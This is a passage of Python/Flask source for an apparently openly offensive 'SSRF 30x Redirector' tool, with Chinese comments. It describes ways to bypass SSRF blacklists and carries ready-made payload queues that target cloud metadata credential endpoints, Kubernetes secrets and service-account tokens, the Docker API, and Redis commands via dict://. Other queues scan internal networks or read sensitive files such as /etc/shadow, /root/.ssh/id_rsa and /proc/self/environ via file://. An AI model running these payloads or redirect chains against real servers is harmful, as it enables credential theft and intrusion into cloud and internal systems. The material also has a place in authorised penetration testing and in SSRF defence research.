#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SSRF 30x Redirector - 终极无状态链式增强版 (云原生实战特化)
================================================
【实战集成】全HTTP方法支持 + K8s/Docker高危POST探测全自动化 + 无状态Base64链 + Gopher自动装填
+ 三大模块高级请求编辑：基础跳转 / 智能链 / 有状态链 均可自定义请求头与请求体
【本次优化】POST POC已包含完整请求体，选择POC后自动预加载Headers与Body，直接可用或修改
【功能调整】1.删除日志仅前端隐藏,后端保留 2.日志显示北京时间 3.有状态链实时查看/删除/修改末跳
【新增功能】有状态链支持批量输入POC队列，后端按顺序依次响应
【v1.3新增】队列批量预填充子模块 + Burp风格原始HTTP请求编辑器
【v1.4新增】HEAD伪装绕过模式 - 解决服务器HEAD探测后拒绝跟随30x的问题
【v1.5新增】1.修复日志面板存储型XSS (ip/method/path/query/时间戳统一转义, method的CSS类名白名单化)
           2.降级跳转模式: Refresh响应头 / Meta刷新 / JS跳转 / 组合模式 (基础跳转与链末跳均支持)
           3.命中时间轴 + 端口开放启发式推断 (配合批量队列, 慢命中=疑似开放, 快命中=疑似关闭)
           4.SSRF绕过助手: IP进制变形/短格式/IPv6映射/零填充/圈数字/nip.io/sslip.io/@欺骗 一键生成
           5.健壮性修复: code/hb_status参数异常不再500; 顺序队列耗尽返回410并与前端提示一致;
             状态码白名单移除无重定向语义的304/305/306
【v1.8新增】🧩 SSRF 绕过方法库大幅扩充 (24+种, 环回IP达28种) 并按绕过原理分类:
           ① 进制变形 (十进制/十六进制/八进制整型, 点分十六/八进制, 混合进制, 短格式a.b/a.b.c,
              零填充八进制陷阱, 末尾加点, 圈数字, 零地址) —— 绕过正则式 IPv4 黑名单
           ② IPv6 变形 (映射/映射hex/兼容格式, 环回简写/完整) —— 绕过仅匹配 IPv4 格式的校验
           ③ DNS 域名解析 (nip.io/sslip.io 及端口前缀格式, localtest.me) —— 域名解析指向内网绕过 IP 黑名单
           ④ URL 解析差异 (@欺骗, 多重斜杠, 反斜杠分隔, URL编码, 双重URL编码, Fragment追加)
              —— 利用校验器与请求库的 URL 解析实现差异
           首跳变形面板与手动绕过助手统一走分类引擎 buildBypassGroups 按原理分组渲染;
           变形后的首跳 URL (十进制/十六进制整型) 可再次解析还原为点分 IP 重新生成全量变形
【v1.9新增】📋 变形 URL 批量复制: 首跳变形面板每行新增复选框, 工具栏支持全选/反选/仅选当前组;
           支持三种导出格式 (仅URL每行一个 / 标签: URL / 按分组分段), 可复制选中或全部,
           便于粘贴到 Intruder / 脚本批量验证; 手动绕过助手同步新增「复制全部变体」按钮
【v2.0架构升级】🔐 启动向导 + HTTPS + 控制台随机路径 + 根路径让渡:
           1.启动时交互式优先选择 80/443 端口 (HTTPS·443 推荐 / HTTP·80 / 自定义), 端口占用自动重试;
           2.支持 HTTPS 部署: 可自动生成自签名证书 (cryptography / openssl CLI 双回退, 含本机IP的SAN,
             保存至 ./ssl_cert/ 复用), 或指定已有证书路径;
           3.Web 控制台每次启动使用随机 URL 路径 (/<16位hex>/), 扫描器/指纹无法直接命中管理界面;
           4.管理 API 同步迁移至随机路径之下 (/<random>/api/*), 原 /api/* 前缀释放给有状态链伪装;
           5.根路径 / 不再被控制台占用, 完整让渡给有状态链: 可注册 / /index.html /api/login 等任意
             逼真伪装路径作为中转/终点节点, 实现"域名+端口+无路径"的干净链入口;
           6.保留路径黑名单同步调整: 仅 /r /c 与控制台随机路径受保护, / 与 /api/* 均可注册为链路径
【v2.1新增】🧪 盲SSRF基准测试模块 (Blind SSRF Benchmark):
           1./bb/* 命名空间下的可控响应端点, 用于探测盲SSRF在面对不同响应时目标服务器的行为差异
             (观察目标是否发起二次请求/报错/超时/重试等, 辅助判断盲SSRF是否存在及其利用方式);
           2.默认基准组开箱即用: /bb/200 /bb/204 /bb/400 /bb/401 /bb/403 /bb/404 /bb/500 /bb/502
             以及 /bb/delay3s (3秒延时) /bb/timeout (30秒延时, 验证目标超时行为);
           3.控制台第4个Tab「盲SSRF基准」支持: 新建/编辑/删除自定义端点 (自定义 /bb/ 下任意路径、
             状态码100-599、Content-Type、响应体、自定义响应头), 手动设置响应延时 (0-60000ms);
           4.每个端点独立命中计数与最后命中时间, 日志面板以紫色「盲测」徽章标识, 并记录实际响应耗时;
           5./bb 前缀已加入保留路径, 防止与有状态链路径冲突
"""
from flask import Flask, request, redirect, render_template_string, jsonify, make_response, abort
from markupsafe import escape as html_escape
import time
import uuid
import json
import base64
import secrets
import socket
import subprocess
import os
import sys
from datetime import datetime, timezone, timedelta
from urllib.parse import quote_plus

app = Flask(__name__)
app.secret_key = str(uuid.uuid4())

# 北京时间 UTC+8
BEIJING_TZ = timezone(timedelta(hours=8))

# ==================== 配置 ====================
CONFIG = {
    'port': 5000,
    'host': '0.0.0.0',
    'max_logs': 1000,
    'default_status_code': 302,
    'access_token': None,
    'use_https': False,
    'ssl_cert': None,
    'ssl_key': None,
}

# ==================== v2.0: 控制台随机路径 (每次启动进程重新生成) ====================
# Web 控制台与管理 API 全部挂载在该随机路径之下, 域名+端口+根路径完整让渡给有状态链;
# 形如 /a3f9c2e1b8d7f0a9, 16位hex, 与 /r /c 等固定入口无冲突
CONSOLE_PATH = '/' + secrets.token_hex(8)

SSL_CERT_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)) or '.', 'ssl_cert')

def get_local_ips():
    """收集本机所有 IPv4 地址 (用于自签名证书 SAN 与启动提示)"""
    ips = {'127.0.0.1'}
    try:
        for ip in socket.gethostbyname_ex(socket.gethostname())[2]:
            if ':' not in ip:
                ips.add(ip)
    except Exception:
        pass
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        ips.add(s.getsockname()[0])
        s.close()
    except Exception:
        pass
    return sorted(ips)

def generate_self_signed_cert(cert_file, key_file):
    """生成自签名证书: 优先 cryptography 库, 回退 openssl CLI; SAN 含本机全部IP与localhost"""
    # 路线1: cryptography 库
    try:
        from cryptography import x509
        from cryptography.x509.oid import NameOID
        from cryptography.hazmat.primitives import hashes, serialization
        from cryptography.hazmat.primitives.asymmetric import rsa
        import ipaddress
        key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, socket.gethostname() or 'ssrf-redirector')])
        san = [x509.DNSName('localhost')]
        for ip in get_local_ips():
            try:
                san.append(x509.IPAddress(ipaddress.ip_address(ip)))
            except Exception:
                pass
        now = datetime.utcnow()
        cert = (x509.CertificateBuilder()
                .subject_name(name).issuer_name(name)
                .public_key(key.public_key())
                .serial_number(x509.random_serial_number())
                .not_valid_before(now - timedelta(days=1))
                .not_valid_after(now + timedelta(days=825))
                .add_extension(x509.SubjectAlternativeName(san), critical=False)
                .sign(key, hashes.SHA256()))
        with open(key_file, 'wb') as f:
            f.write(key.private_bytes(serialization.Encoding.PEM,
                                      serialization.PrivateFormat.TraditionalOpenSSL,
                                      serialization.NoEncryption()))
        with open(cert_file, 'wb') as f:
            f.write(cert.public_bytes(serialization.Encoding.PEM))
        return True
    except ImportError:
        pass
    except Exception as e:
        print(f"⚠️ cryptography 证书生成失败: {e}, 尝试 openssl CLI 回退...")
    # 路线2: openssl 命令行回退
    try:
        san_ip = ','.join(f'IP:{ip}' for ip in get_local_ips())
        subprocess.run(
            ['openssl', 'req', '-x509', '-newkey', 'rsa:2048', '-sha256', '-days', '825', '-nodes',
             '-keyout', key_file, '-out', cert_file,
             '-subj', '/CN=ssrf-redirector',
             '-addext', f'subjectAltName=DNS:localhost,{san_ip}'],
            check=True, capture_output=True, timeout=60)
        return True
    except Exception:
        return False

def is_port_free(host, port):
    """预检端口是否可绑定 (80/443 占用或权限不足时启动前提示重选)"""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.bind((host, port))
            return True
        except OSError:
            return False


# 仅保留具有 Location 重定向语义的状态码 (304/305/306 无跳转语义, 已移除)
VALID_30X_CODES = {300, 301, 302, 303, 307, 308}
SUPPORTED_METHODS = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'TRACE', 'OPTIONS', 'HEAD', 'CONNECT']

# 降级跳转模式 (针对不跟随30x的客户端)
FALLBACK_MODES = {'30x', 'refresh', 'meta', 'js', 'combo'}

# HEAD伪装响应的默认配置
HEAD_BYPASS_CONFIG = {
    'status_code': 200,
    'content_type': 'text/html; charset=utf-8',
    'fake_content_length': '8192',
    'extra_headers': {
        'Server': 'nginx/1.18.0',
        'X-Powered-By': 'PHP/7.4.3',
        'Connection': 'keep-alive',
        'Accept-Ranges': 'bytes',
    }
}

# ==================== 全局存储 ====================
LOGS = []
STATEFUL_CHAINS = {}
PATH_MAP = {}

# ==================== v2.1: 盲SSRF基准测试模块 (Blind SSRF Benchmark) ====================
# 用途: 在 /bb/* 命名空间下提供完全可控的 HTTP 响应端点。
# 将盲SSRF payload 指向这些端点, 通过观察目标服务器对不同状态码/响应体/延时的反应
# (是否二次请求、是否报错、超时阈值、重试行为、回显差异等) 来标定盲SSRF的行为基线。
BLIND_BENCH = {}        # endpoint_id -> 端点配置
BLIND_BENCH_PATH = {}   # 路径 -> endpoint_id (快速路由查找)

BB_ALLOWED_PATH_CHARS = set('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_.~/')
BB_MAX_DELAY_MS = 60000   # 响应延时上限 (60秒)
BB_MAX_BODY_LEN = 20000   # 响应体长度上限 (字符)

# 默认基准组: 覆盖 2xx/4xx/5xx 典型状态码 + 延时基线端点
BLIND_BENCH_DEFAULTS = [
    {'path': '/bb/200',      'status': 200, 'content_type': 'text/html; charset=utf-8',
     'body': '<html><body><h1>200 OK</h1><p>Blind SSRF Benchmark Endpoint</p></body></html>',
     'delay_ms': 0,     'desc': '基准: 正常响应'},
    {'path': '/bb/204',      'status': 204, 'content_type': 'text/html; charset=utf-8',
     'body': '', 'delay_ms': 0, 'desc': '基准: 无内容响应'},
    {'path': '/bb/400',      'status': 400, 'content_type': 'text/html; charset=utf-8',
     'body': '<html><body><h1>400 Bad Request</h1></body></html>', 'delay_ms': 0, 'desc': '基准: 客户端错误'},
    {'path': '/bb/401',      'status': 401, 'content_type': 'text/html; charset=utf-8',
     'body': '<html><body><h1>401 Unauthorized</h1></body></html>', 'delay_ms': 0, 'desc': '基准: 未认证'},
    {'path': '/bb/403',      'status': 403, 'content_type': 'text/html; charset=utf-8',
     'body': '<html><body><h1>403 Forbidden</h1></body></html>', 'delay_ms': 0, 'desc': '基准: 禁止访问'},
    {'path': '/bb/404',      'status': 404, 'content_type': 'text/html; charset=utf-8',
     'body': '<html><body><h1>404 Not Found</h1></body></html>', 'delay_ms': 0, 'desc': '基准: 资源不存在'},
    {'path': '/bb/500',      'status': 500, 'content_type': 'text/html; charset=utf-8',
     'body': '<html><body><h1>500 Internal Server Error</h1></body></html>', 'delay_ms': 0, 'desc': '基准: 服务器错误'},
    {'path': '/bb/502',      'status': 502, 'content_type': 'text/html; charset=utf-8',
     'body': '<html><body><h1>502 Bad Gateway</h1></body></html>', 'delay_ms': 0, 'desc': '基准: 网关错误'},
    {'path': '/bb/delay3s',  'status': 200, 'content_type': 'text/html; charset=utf-8',
     'body': '<html><body><h1>200 OK (delayed 3s)</h1></body></html>', 'delay_ms': 3000, 'desc': '延时基线: 3秒'},
    {'path': '/bb/timeout',  'status': 200, 'content_type': 'text/html; charset=utf-8',
     'body': '<html><body><h1>200 OK (delayed 30s)</h1></body></html>', 'delay_ms': 30000, 'desc': '延时基线: 30秒 (探测目标超时阈值)'},
]

def bb_validate_path(path):
    """校验盲测端点路径: 必须位于 /bb/ 命名空间下, 无目录穿越, 字符集受控"""
    if not isinstance(path, str):
        return None
    path = path.strip()
    if not path.startswith('/'):
        path = '/' + path
    if not path.startswith('/bb/'):
        return None
    if len(path) < 5 or len(path) > 128:
        return None
    if '..' in path or '//' in path:
        return None
    if any(ch not in BB_ALLOWED_PATH_CHARS for ch in path):
        return None
    return path

def bb_register(path, status=200, body='', content_type='text/html; charset=utf-8',
                delay_ms=0, headers=None, desc='', ep_id=None):
    """注册/覆盖一个盲测端点 (供默认组初始化与 API 共用)"""
    ep_id = ep_id or str(uuid.uuid4())[:8]
    cfg = {
        'id': ep_id,
        'path': path,
        'status': status,
        'content_type': content_type or 'text/html; charset=utf-8',
        'body': body or '',
        'headers': dict(headers or {}),
        'delay_ms': delay_ms,
        'desc': desc or '',
        'hits': 0,
        'last_hit': None,
        'created_at': get_beijing_time(),
    }
    # 若覆盖同路径旧端点, 保留命中统计
    old_id = BLIND_BENCH_PATH.get(path)
    if old_id and old_id in BLIND_BENCH and old_id != ep_id:
        cfg['hits'] = BLIND_BENCH[old_id].get('hits', 0)
        cfg['last_hit'] = BLIND_BENCH[old_id].get('last_hit')
        del BLIND_BENCH[old_id]
    BLIND_BENCH[ep_id] = cfg
    BLIND_BENCH_PATH[path] = ep_id
    return cfg

# ==================== 批量队列预设模板 ====================
QUEUE_PRESETS = {
    "local_ports": {
        "name": "🔍 本地端口服务扫描",
        "description": "扫描本机常见端口服务(HTTP/SSH/Redis/FTP/SMTP等)",
        "payloads": [
            "http://127.0.0.1:21/",
            "http://127.0.0.1:22/",
            "http://127.0.0.1:23/",
            "http://127.0.0.1:25/",
            "http://127.0.0.1:80/",
            "http://127.0.0.1:110/",
            "http://127.0.0.1:443/",
            "http://127.0.0.1:445/",
            "http://127.0.0.1:873/",
            "http://127.0.0.1:1080/",
            "http://127.0.0.1:1433/",
            "http://127.0.0.1:1521/",
            "http://127.0.0.1:2049/",
            "http://127.0.0.1:2181/",
            "http://127.0.0.1:2375/",
            "http://127.0.0.1:2376/",
            "http://127.0.0.1:3000/",
            "http://127.0.0.1:3306/",
            "http://127.0.0.1:4848/",
            "http://127.0.0.1:5000/",
            "http://127.0.0.1:5432/",
            "http://127.0.0.1:5672/",
            "http://127.0.0.1:5900/",
            "http://127.0.0.1:6379/",
            "http://127.0.0.1:6443/",
            "http://127.0.0.1:7001/",
            "http://127.0.0.1:7002/",
            "http://127.0.0.1:8000/",
            "http://127.0.0.1:8080/",
            "http://127.0.0.1:8081/",
            "http://127.0.0.1:8443/",
            "http://127.0.0.1:8888/",
            "http://127.0.0.1:9000/",
            "http://127.0.0.1:9090/",
            "http://127.0.0.1:9200/",
            "http://127.0.0.1:9300/",
            "http://127.0.0.1:9443/",
            "http://127.0.0.1:10250/",
            "http://127.0.0.1:10255/",
            "http://127.0.0.1:11211/",
            "http://127.0.0.1:15672/",
            "http://127.0.0.1:27017/",
            "http://127.0.0.1:28017/",
            "http://127.0.0.1:50070/",
            "http://127.0.0.1:50075/",
        ]
    },
    "local_ports_dict": {
        "name": "🔍 Dict协议端口扫描",
        "description": "使用dict协议探测非HTTP服务(Redis/MySQL/SSH/FTP/SMTP等)",
        "payloads": [
            "dict://127.0.0.1:21/",
            "dict://127.0.0.1:22/",
            "dict://127.0.0.1:23/",
            "dict://127.0.0.1:25/EHLO test",
            "dict://127.0.0.1:110/",
            "dict://127.0.0.1:143/",
            "dict://127.0.0.1:389/",
            "dict://127.0.0.1:445/",
            "dict://127.0.0.1:1433/",
            "dict://127.0.0.1:1521/",
            "dict://127.0.0.1:3306/",
            "dict://127.0.0.1:5432/",
            "dict://127.0.0.1:5672/",
            "dict://127.0.0.1:6379/INFO",
            "dict://127.0.0.1:6379/KEYS *",
            "dict://127.0.0.1:9000/",
            "dict://127.0.0.1:11211/stats",
            "dict://127.0.0.1:27017/",
        ]
    },
    "spring_actuator": {
        "name": "🌱 Spring Boot Actuator",
        "description": "Spring Boot敏感端点探测(env/heapdump/configprops等)",
        "payloads": [
            "http://127.0.0.1:8080/actuator",
            "http://127.0.0.1:8080/actuator/env",
            "http://127.0.0.1:8080/actuator/health",
            "http://127.0.0.1:8080/actuator/info",
            "http://127.0.0.1:8080/actuator/beans",
            "http://127.0.0.1:8080/actuator/configprops",
            "http://127.0.0.1:8080/actuator/mappings",
            "http://127.0.0.1:8080/actuator/metrics",
            "http://127.0.0.1:8080/actuator/heapdump",
            "http://127.0.0.1:8080/actuator/threaddump",
            "http://127.0.0.1:8080/actuator/loggers",
            "http://127.0.0.1:8080/actuator/trace",
            "http://127.0.0.1:8080/actuator/httptrace",
            "http://127.0.0.1:8080/actuator/scheduledtasks",
            "http://127.0.0.1:8080/actuator/conditions",
            "http://127.0.0.1:8080/actuator/auditevents",
            "http://127.0.0.1:8080/actuator/jolokia",
            "http://127.0.0.1:8080/actuator/gateway/routes",
            "http://127.0.0.1:8080/env",
            "http://127.0.0.1:8080/health",
            "http://127.0.0.1:8080/info",
            "http://127.0.0.1:8080/beans",
            "http://127.0.0.1:8080/configprops",
            "http://127.0.0.1:8080/mappings",
            "http://127.0.0.1:8080/metrics",
            "http://127.0.0.1:8080/heapdump",
            "http://127.0.0.1:8080/trace",
            "http://127.0.0.1:8080/jolokia",
            "http://127.0.0.1:8080/jolokia/list",
            "http://127.0.0.1:8080/api-docs",
            "http://127.0.0.1:8080/swagger-ui.html",
            "http://127.0.0.1:8080/v2/api-docs",
        ]
    },
    "k8s_services": {
        "name": "☸️ K8s集群服务探测",
        "description": "Kubernetes集群内部服务端点探测",
        "payloads": [
            "https://kubernetes.default.svc/api",
            "https://kubernetes.default.svc/api/v1",
            "https://kubernetes.default.svc/api/v1/pods",
            "https://kubernetes.default.svc/api/v1/secrets",
            "https://kubernetes.default.svc/api/v1/services",
            "https://kubernetes.default.svc/api/v1/nodes",
            "https://kubernetes.default.svc/api/v1/namespaces",
            "https://kubernetes.default.svc/api/v1/configmaps",
            "https://kubernetes.default.svc/api/v1/endpoints",
            "https://kubernetes.default.svc/apis/apps/v1/deployments",
            "https://kubernetes.default.svc/apis/apps/v1/daemonsets",
            "https://kubernetes.default.svc/apis/rbac.authorization.k8s.io/v1/clusterroles",
            "https://kubernetes.default.svc/apis/rbac.authorization.k8s.io/v1/clusterrolebindings",
            "https://kubernetes.default.svc/version",
            "https://kubernetes.default.svc/healthz",
            "https://kubernetes.default.svc/readyz",
            "https://kubernetes.default.svc/livez",
            "https://127.0.0.1:10250/pods",
            "https://127.0.0.1:10250/metrics",
            "https://127.0.0.1:10250/runningpods/",
            "https://127.0.0.1:10250/stats/summary",
            "http://127.0.0.1:10255/pods",
            "http://127.0.0.1:10255/metrics",
            "http://127.0.0.1:8001/api/v1/pods",
            "http://127.0.0.1:8001/api/v1/secrets",
            "http://127.0.0.1:2379/version",
            "http://127.0.0.1:2379/v2/keys/",
            "http://127.0.0.1:2379/v2/members",
            "http://127.0.0.1:6443/api",
            "http://127.0.0.1:8080/api/v1/pods",
        ]
    },
    "docker_api": {
        "name": "🐳 Docker API探测",
        "description": "Docker Remote API端点扫描",
        "payloads": [
            "http://127.0.0.1:2375/version",
            "http://127.0.0.1:2375/info",
            "http://127.0.0.1:2375/containers/json",
            "http://127.0.0.1:2375/containers/json?all=1",
            "http://127.0.0.1:2375/images/json",
            "http://127.0.0.1:2375/volumes",
            "http://127.0.0.1:2375/networks",
            "http://127.0.0.1:2375/events",
            "http://127.0.0.1:2375/swarm",
            "http://127.0.0.1:2375/nodes",
            "http://127.0.0.1:2375/services",
            "http://127.0.0.1:2375/secrets",
            "http://127.0.0.1:2375/configs",
            "http://127.0.0.1:2376/version",
            "http://127.0.0.1:2376/containers/json",
            "http://172.17.0.1:2375/version",
            "http://172.17.0.1:2375/containers/json",
        ]
    },
    "database_services": {
        "name": "🗄️ 数据库服务探测",
        "description": "MySQL/PostgreSQL/ClickHouse/Oracle/MongoDB/Redis等数据库探测",
        "payloads": [
            "http://127.0.0.1:3306/",
            "dict://127.0.0.1:3306/",
            "http://127.0.0.1:5432/",
            "dict://127.0.0.1:5432/",
            "http://127.0.0.1:1521/",
            "dict://127.0.0.1:1521/",
            "http://127.0.0.1:1433/",
            "dict://127.0.0.1:1433/",
            "http://127.0.0.1:6379/",
            "dict://127.0.0.1:6379/INFO",
            "dict://127.0.0.1:6379/CONFIG GET *",
            "dict://127.0.0.1:6379/DBSIZE",
            "http://127.0.0.1:27017/",
            "http://127.0.0.1:28017/",
            "http://127.0.0.1:27017/serverStatus",
            "http://127.0.0.1:11211/",
            "dict://127.0.0.1:11211/stats",
            "dict://127.0.0.1:11211/stats items",
            "http://127.0.0.1:8123/",
            "http://127.0.0.1:8123/?query=SELECT%201",
            "http://127.0.0.1:8123/?query=SHOW%20DATABASES",
            "http://127.0.0.1:8123/?query=SHOW%20TABLES",
            "http://127.0.0.1:9000/",
            "http://127.0.0.1:9004/",
            "http://127.0.0.1:5984/",
            "http://127.0.0.1:5984/_all_dbs",
            "http://127.0.0.1:5984/_config",
            "http://127.0.0.1:7474/",
            "http://127.0.0.1:7474/browser/",
            "http://127.0.0.1:9042/",
            "http://127.0.0.1:15672/api/overview",
            "http://127.0.0.1:15672/api/queues",
            "http://127.0.0.1:8529/",
            "http://127.0.0.1:8529/_api/version",
        ]
    },
    "cloud_metadata": {
        "name": "☁️ 云元数据全量探测",
        "description": "AWS/阿里云/腾讯云/GCP/Azure/华为云元数据",
        "payloads": [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/meta-data/hostname",
            "http://169.254.169.254/latest/meta-data/local-ipv4",
            "http://169.254.169.254/latest/meta-data/public-ipv4",
            "http://169.254.169.254/latest/meta-data/ami-id",
            "http://169.254.169.254/latest/meta-data/instance-id",
            "http://169.254.169.254/latest/meta-data/instance-type",
            "http://169.254.169.254/latest/user-data",
            "http://169.254.169.254/latest/dynamic/instance-identity/document",
            "http://100.100.100.200/latest/meta-data/",
            "http://100.100.100.200/latest/meta-data/ram/security-credentials/",
            "http://100.100.100.200/latest/meta-data/instance-id",
            "http://100.100.100.200/latest/meta-data/hostname",
            "http://100.100.100.200/latest/meta-data/image-id",
            "http://100.100.100.200/latest/user-data",
            "http://169.254.0.211/latest/meta-data/",
            "http://169.254.0.211/latest/meta-data/instance-id",
            "http://169.254.0.211/latest/meta-data/cam/security-credentials/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://metadata.google.internal/computeMetadata/v1/instance/",
            "http://metadata.google.internal/computeMetadata/v1/project/",
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
            "http://169.254.169.254/openstack/latest/meta_data.json",
            "http://169.254.169.254/openstack/latest/user_data",
        ]
    },
    "internal_webapp": {
        "name": "🌐 内网Web应用探测",
        "description": "Tomcat/Jenkins/Nacos/Consul/Grafana/Harbor等管理后台",
        "payloads": [
            "http://127.0.0.1:8080/manager/html",
            "http://127.0.0.1:8080/",
            "http://127.0.0.1:8080/script",
            "http://127.0.0.1:8080/jenkins/script",
            "http://127.0.0.1:8848/nacos/",
            "http://127.0.0.1:8848/nacos/v1/cs/configs?dataId=&group=&tenant=",
            "http://127.0.0.1:8848/nacos/v1/auth/users?pageNo=1&pageSize=9",
            "http://127.0.0.1:8500/v1/agent/self",
            "http://127.0.0.1:8500/v1/kv/?recurse",
            "http://127.0.0.1:8500/v1/catalog/services",
            "http://127.0.0.1:3000/api/admin/settings",
            "http://127.0.0.1:3000/api/dashboards/home",
            "http://127.0.0.1:3000/api/org",
            "http://127.0.0.1:9090/api/v1/targets",
            "http://127.0.0.1:9090/api/v1/status/config",
            "http://127.0.0.1:9090/api/v1/label/__name__/values",
            "http://127.0.0.1:8161/admin/",
            "http://127.0.0.1:15672/api/overview",
            "http://127.0.0.1:8088/ws/v1/cluster/apps",
            "http://127.0.0.1:8088/ws/v1/cluster/nodes",
            "http://127.0.0.1:50070/",
            "http://127.0.0.1:50075/",
            "http://127.0.0.1:8983/solr/admin/cores",
            "http://127.0.0.1:9200/_cat/indices",
            "http://127.0.0.1:9200/_cluster/health",
            "http://127.0.0.1:9200/_nodes",
            "http://127.0.0.1:5601/api/status",
            "http://127.0.0.1:8000/",
            "http://127.0.0.1:4443/",
            "http://127.0.0.1:10080/",
        ]
    },
    "file_read": {
        "name": "📁 敏感文件读取",
        "description": "file协议读取系统/应用敏感文件",
        "payloads": [
            "file:///etc/passwd",
            "file:///etc/shadow",
            "file:///etc/hosts",
            "file:///etc/hostname",
            "file:///etc/resolv.conf",
            "file:///etc/issue",
            "file:///etc/os-release",
            "file:///etc/crontab",
            "file:///etc/nginx/nginx.conf",
            "file:///etc/apache2/sites-enabled/000-default.conf",
            "file:///etc/httpd/conf/httpd.conf",
            "file:///etc/mysql/my.cnf",
            "file:///etc/redis/redis.conf",
            "file:///etc/ssh/sshd_config",
            "file:///root/.ssh/id_rsa",
            "file:///root/.ssh/authorized_keys",
            "file:///root/.bash_history",
            "file:///proc/self/environ",
            "file:///proc/self/cmdline",
            "file:///proc/self/cgroup",
            "file:///proc/self/mountinfo",
            "file:///proc/1/cgroup",
            "file:///proc/net/tcp",
            "file:///proc/net/arp",
            "file:///var/run/secrets/kubernetes.io/serviceaccount/token",
            "file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt",
            "file:///var/run/secrets/kubernetes.io/serviceaccount/namespace",
            "file:///var/www/html/config.php",
            "file:///var/www/html/.env",
            "file:///usr/local/tomcat/conf/tomcat-users.xml",
            "file:///usr/local/tomcat/conf/server.xml",
            "file:///opt/application/application.yml",
            "file:///opt/application/application.properties",
        ]
    },
    "cidr_scan_10": {
        "name": "🌐 内网C段探测 (10.0.0.x)",
        "description": "探测10.0.0.1-10.0.0.20的HTTP服务",
        "payloads": [f"http://10.0.0.{i}/" for i in range(1, 21)]
    },
    "cidr_scan_172": {
        "name": "🌐 内网C段探测 (172.17.0.x)",
        "description": "探测Docker默认网桥172.17.0.1-172.17.0.20",
        "payloads": [f"http://172.17.0.{i}/" for i in range(1, 21)]
    },
    "cidr_scan_192": {
        "name": "🌐 内网C段探测 (192.168.1.x)",
        "description": "探测192.168.1.1-192.168.1.20的HTTP服务",
        "payloads": [f"http://192.168.1.{i}/" for i in range(1, 21)]
    },
}

# ==================== 内置实战 POC 列表 (大幅强化版 + 完整请求体) ====================
POC_LIST = [
    # ---------- 云元数据 ----------
    {'name': 'AWS 元数据 v1', 'category': '云元数据', 'method': 'GET', 'payload': 'http://169.254.169.254/latest/meta-data/', 'description': 'AWS EC2实例元数据服务'},
    {'name': 'AWS 元数据 v2 Token', 'category': '云元数据', 'method': 'PUT',
     'payload': 'http://169.254.169.254/latest/api/token',
     'description': 'IMDSv2 获取令牌 (需PUT)',
     'headers': {'X-aws-ec2-metadata-token-ttl-seconds': '21600'}},
    {'name': 'AWS 元数据 IAM角色名', 'category': '云元数据', 'method': 'GET', 'payload': 'http://169.254.169.254/latest/meta-data/iam/security-credentials/', 'description': '列出IAM角色名'},
    {'name': '阿里云元数据探测', 'category': '云元数据', 'method': 'GET', 'payload': 'http://100.100.100.200/latest/meta-data/', 'description': '阿里云ECS元数据服务'},
    {'name': '阿里云 RAM 角色凭证', 'category': '云元数据', 'method': 'GET', 'payload': 'http://100.100.100.200/latest/meta-data/ram/security-credentials/', 'description': '获取RAM角色临时凭证名'},
    {'name': '腾讯云元数据探测', 'category': '云元数据', 'method': 'GET', 'payload': 'http://169.254.0.211/latest/meta-data/', 'description': '腾讯云CVM元数据服务'},
    {'name': 'Google Cloud 元数据', 'category': '云元数据', 'method': 'GET', 'payload': 'http://metadata.google.internal/computeMetadata/v1/', 'description': 'GCP元数据(需Header)'},
    {'name': 'Azure 元数据 (2021)', 'category': '云元数据', 'method': 'GET',
     'payload': 'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
     'description': 'Azure实例元数据 (需Header: Metadata:true)',
     'headers': {'Metadata': 'true'}},
    {'name': '华为云元数据', 'category': '云元数据', 'method': 'GET', 'payload': 'http://169.254.169.254/openstack/latest/meta_data.json', 'description': '华为云/OpenStack 元数据'},
    {'name': 'OpenStack 元数据', 'category': '云元数据', 'method': 'GET', 'payload': 'http://169.254.169.254/openstack', 'description': 'OpenStack 通用元数据端点'},

    # ---------- 高危端口/服务探测 ----------
    {'name': 'Redis 未授权探测', 'category': '端口探测', 'method': 'GET', 'payload': 'dict://127.0.0.1:6379/info', 'description': 'dict协议探测Redis服务信息'},
    {'name': 'MySQL 端口探测', 'category': '端口探测', 'method': 'GET', 'payload': 'dict://127.0.0.1:3306/', 'description': '探测MySQL端口是否开放'},
    {'name': 'Memcached 端口探测', 'category': '端口探测', 'method': 'GET', 'payload': 'dict://127.0.0.1:11211/stats', 'description': '探测Memcached状态'},
    {'name': 'SSH 端口探测', 'category': '端口探测', 'method': 'GET', 'payload': 'dict://127.0.0.1:22/', 'description': '探测SSH服务'},
    {'name': 'Elasticsearch 9200 探测', 'category': '端口探测', 'method': 'GET', 'payload': 'http://127.0.0.1:9200/', 'description': 'Elasticsearch HTTP接口'},
    {'name': 'Docker API 2375 探测', 'category': '端口探测', 'method': 'GET', 'payload': 'http://127.0.0.1:2375/version', 'description': 'Docker Remote API版本探测'},
    {'name': 'Kubelet 10250 探测', 'category': '端口探测', 'method': 'GET', 'payload': 'https://127.0.0.1:10250/metrics', 'description': 'Kubelet metrics接口 (需处理TLS)'},
    {'name': 'Zabbix 10051 探测', 'category': '端口探测', 'method': 'GET', 'payload': 'http://127.0.0.1:10051/', 'description': 'Zabbix Server端口'},
    {'name': 'SMTP 25 端口探测', 'category': '端口探测', 'method': 'GET', 'payload': 'dict://127.0.0.1:25/', 'description': 'SMTP服务'},
    {'name': 'FTP 21 端口探测', 'category': '端口探测', 'method': 'GET', 'payload': 'dict://127.0.0.1:21/', 'description': 'FTP服务'},
